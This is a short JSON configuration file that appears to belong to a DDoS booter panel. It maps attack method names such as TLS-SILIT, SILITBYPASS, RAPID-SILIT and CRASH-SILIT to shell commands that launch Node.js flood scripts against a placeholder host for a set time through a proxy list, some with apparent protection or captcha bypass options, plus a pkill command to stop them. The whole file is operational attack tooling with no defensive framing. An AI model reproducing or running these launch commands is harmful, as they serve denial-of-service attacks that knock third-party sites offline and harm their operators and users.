[
    {
        "methods": "TLS-SILIT",
        "command": "cd /root/mahmud/ && [SCREEN_CMD] node TLS-SILITv3 [HOST] [TIME] 9 3 proxy.txt"
    },
    {
        "methods": "TLS-NARUTO",
        "command": "cd /root/mahmud/ && [SCREEN_CMD] node TLS-NARUTO [HOST] 3 9 [TIME]"
    },
    {
        "methods": "SILITBYPASS",
        "command": "cd /root/mahmud/ && [SCREEN_CMD] node SILITBYPASS [HOST] [TIME] 9 3 proxy.txt"
    },
    {
        "methods": "RAPID-SILIT",
        "command": "cd /root/mahmud/ && [SCREEN_CMD] node Rapid-Silit [HOST] [TIME] 3 proxy.txt 9 captha"
    },
    {
        "methods": "CRASH-SILIT",
        "command": "cd /root/mahmud/ && [SCREEN_CMD] node Crash-Silit [HOST] [TIME] 9 3 proxy.txt"
    },
    {
        "methods": "HTTPS",
        "command": "cd /root/mahmud/ && [SCREEN_CMD] node https [HOST] [TIME] 6 3 proxy.txt bypass"
    },
    {
        "methods": "STOP",
        "command": "pkill -f [SCREEN_NAME]"
    }
]